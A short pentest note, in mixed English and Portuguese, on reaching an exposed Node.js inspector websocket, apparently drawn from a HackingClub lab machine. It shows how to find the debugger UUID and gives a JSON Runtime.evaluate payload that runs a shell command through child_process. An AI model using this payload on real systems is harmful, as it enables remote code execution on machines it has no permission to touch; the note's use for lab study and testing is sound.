## CEF debug abuse
When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.

Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

Para descobrimos onde o debugger do node está rodando podemos bater no endpoint `http://127.0.0.1:9229/json/list`, assim descobrimos qual o UUID que está sendo utilizado. Claro que o hostname e a porta podem variar dependendo das configurações. Mas podemos acusar endpoints pelo nome dado como na máquina `Tunnel` do `HackingClub` que utiliza `http://127.0.0.1/admin/internal/-web-socket-endpoint/`.

Assim podemos que o endpoint onde o debugger está rodando seria o `ws://127.0.0.1/admin/internal/-web-socket-endpoint/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`

#### RCE
Se tivermos acesso a esse endpoint podemos utilizar o método `Runtime.evaluate` (famoso eval) para executar comandos.
```sh
ws://127.0.0.1/admin/internal/-web-socket-endpoint/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e
{
	"id": 1,
	"method": "Runtime.evaluate",
	"params":{
		"expression":"process.mainModule.require('child_process').execSync(\"id\").toString();"
	} 
}
```